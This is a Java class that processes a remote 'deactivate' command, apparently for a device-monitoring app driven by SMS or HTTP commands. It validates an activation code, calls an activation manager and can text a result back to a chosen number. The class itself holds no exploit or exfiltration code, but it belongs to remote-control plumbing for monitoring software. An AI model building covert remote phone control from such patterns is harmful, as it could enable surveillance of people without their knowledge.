package com.vvt.remotecommandmanager.processor.activationandinstallation;

import java.util.concurrent.CountDownLatch;

import com.vvt.activation_manager.ActivationListener;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.exceptions.FxConcurrentRequestNotAllowedException;
import com.vvt.exceptions.FxExecutionTimeoutException;
import com.vvt.license.LicenseInfo;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class DeactivateProcessor extends RemoteCommandProcessor {
	private static final String TAG = "DeactivateProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private ActivationManager mActivationManager;
	private CountDownLatch mWaitForResponseLatch;
	private LicenseInfo mLicenseInfo;
	
	public DeactivateProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, ActivationManager activationManager) {
		super(appContext,eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mActivationManager = activationManager;
	}
	
	@Override
	public ProcessingType getProcessingType() {
		 return ProcessingType.ASYNC_HTTP;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER...");
		mWaitForResponseLatch = new CountDownLatch(1);
		
		validateRemoteCommandData(commandData);
		
		if(commandData.isSmsReplyRequired()) {
			if(commandData.getArguments().size() == 2) {
				mRecipientNumber = commandData.getArguments().get(1);
			}
			else {
				mRecipientNumber = commandData.getSenderNumber();
			}
		}
		
		try {
			
			String activationCode = commandData.getArguments().get(0);
			mActivationManager.deactivate(activationCode, mActivationListener);
			
			//Block the thread and wait till onSuccess or onError called.
			try { mWaitForResponseLatch.await(); } catch (InterruptedException e) {
				if(LOGE) FxLog.e(TAG, e.getMessage());
			}
			
		} catch (FxConcurrentRequestNotAllowedException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.DEACTIVATE_ALREADY_IN_PROCESS);
			
		} catch (FxExecutionTimeoutException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.DEACTIVATE_PROCESS_TIMEOUT);
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT...");
	}

	ActivationListener mActivationListener = new ActivationListener() {
		
		@Override
		public void onSuccess() {
			if(LOGV) FxLog.v(TAG, "onSuccess # ENTER...");
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(MessageManager.DEACTIVATE_SUCCESS);
			
			if(LOGD) FxLog.d(TAG, "onSuccess # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onSuccess # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onSuccess # EXIT...");
			mWaitForResponseLatch.countDown();
			
		}
		
		@Override
		public void onError(ErrorResponseType errorType, int code, String msg) {
			if(LOGV) FxLog.v(TAG, "onSuccess # ENTER...");
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.getErrorMessage(code));
			
			if(LOGD) FxLog.d(TAG, "onError # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onError # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onError # EXIT...");
			mWaitForResponseLatch.countDown(); 
			
		}
	};
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		//Command should only have 1 or 2 (<RECIPIENT_NUMBER>) arguments.
		if(!(commandData.getArguments().size() >= 1 && commandData.getArguments().size() <= 2)) {
			throw new InvalidCommandFormatException();
		}
		
		RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);		
		
	}
	
	
	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
